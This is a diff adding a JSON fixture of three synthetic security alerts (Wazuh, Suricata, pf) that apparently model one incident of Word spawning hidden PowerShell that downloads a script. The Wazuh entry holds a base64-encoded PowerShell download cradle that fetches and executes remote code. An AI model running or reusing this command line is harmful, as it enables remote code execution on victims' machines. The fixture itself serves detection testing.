@@ -1,0 +1,141 @@
+[
+  {
+    "id": "wazuh-encoded-ps-outbound-001",
+    "source": "wazuh",
+    "timestamp": "2026-07-15T03:41:12Z",
+    "payload": {
+      "id": "wazuh-encoded-ps-outbound-001",
+      "timestamp": "2026-07-15T03:41:12Z",
+      "agent": {
+        "id": "031",
+        "name": "eng-ws-031",
+        "ip": "10.0.4.31",
+        "os": {
+          "name": "Windows 11 Pro"
+        }
+      },
+      "manager": {
+        "name": "wazuh-manager-01"
+      },
+      "rule": {
+        "id": "92001",
+        "level": 12,
+        "description": "Suspicious PowerShell encoded command execution with hidden window",
+        "groups": [
+          "windows",
+          "powershell",
+          "execution"
+        ],
+        "mitre": {
+          "id": [
+            "T1059.001",
+            "T1027"
+          ],
+          "tactic": [
+            "Execution",
+            "Defense Evasion"
+          ],
+          "technique": [
+            "PowerShell",
+            "Obfuscated Files or Information"
+          ]
+        }
+      },
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Security-Auditing",
+            "eventID": "4688",
+            "computer": "eng-ws-031"
+          },
+          "eventdata": {
+            "subjectUserName": "dpatel",
+            "targetUserName": "dpatel",
+            "newProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "parentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "commandLine": "powershell.exe -w hidden -nop -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADgALgA4AC4AOAAuADgALwBiAC8AbAAuAHAAcwAxACcAKQA="
+          }
+        },
+        "dstuser": "dpatel",
+        "srcip": "10.0.4.31",
+        "dstip": "8.8.8.8"
+      },
+      "full_log": "Windows process creation: WINWORD.EXE spawned hidden-window encoded PowerShell as dpatel on eng-ws-031"
+    }
+  },
+  {
+    "id": "so-suricata-ps-cradle-001",
+    "source": "security_onion",
+    "timestamp": "2026-07-15T03:41:29Z",
+    "payload": {
+      "event": {
+        "id": "so-suricata-ps-cradle-001",
+        "module": "suricata",
+        "dataset": "suricata.eve",
+        "kind": "alert",
+        "category": "network"
+      },
+      "@timestamp": "2026-07-15T03:41:29Z",
+      "source": {
+        "ip": "10.0.4.31",
+        "port": 51134
+      },
+      "destination": {
+        "ip": "8.8.8.8",
+        "port": 80
+      },
+      "host": {
+        "name": "securityonion-sensor-01"
+      },
+      "network": {
+        "protocol": "http",
+        "transport": "tcp",
+        "direction": "outbound"
+      },
+      "suricata": {
+        "eve": {
+          "event_type": "alert",
+          "alert": {
+            "signature_id": 2024218,
+            "signature": "ET TROJAN Possible PowerShell Download Cradle",
+            "category": "Trojan Activity",
+            "severity": 1
+          },
+          "flow": {
+            "pkts_toserver": 14,
+            "pkts_toclient": 22,
+            "bytes_toserver": 2104,
+            "bytes_toclient": 88420
+          },
+          "http": {
+            "hostname": "8.8.8.8",
+            "url": "/b/l.ps1",
+            "http_method": "GET",
+            "status": 200,
+            "http_user_agent": "Mozilla/5.0 (Windows NT; Windows NT 10.0) WindowsPowerShell/5.1.22621.2428"
+          }
+        }
+      },
+      "message": "ET TROJAN Possible PowerShell Download Cradle from 10.0.4.31 to 8.8.8.8"
+    }
+  },
+  {
+    "id": "pf-pass-out-ps-001",
+    "source": "openbsd_pf",
+    "timestamp": "2026-07-15T03:41:29Z",
+    "payload": {
+      "timestamp": "2026-07-15T03:41:29Z",
+      "action": "pass",
+      "direction": "out",
+      "interface": "em0",
+      "rule_number": "12",
+      "protocol": "tcp",
+      "src_ip": "10.0.4.31",
+      "src_port": 51134,
+      "dst_ip": "8.8.8.8",
+      "dst_port": 80,
+      "hostname": "pf-edge-01",
+      "raw_line": "rule 12/(match) pass out on em0: 10.0.4.31.51134 > 8.8.8.8.80: tcp"
+    }
+  }
+]
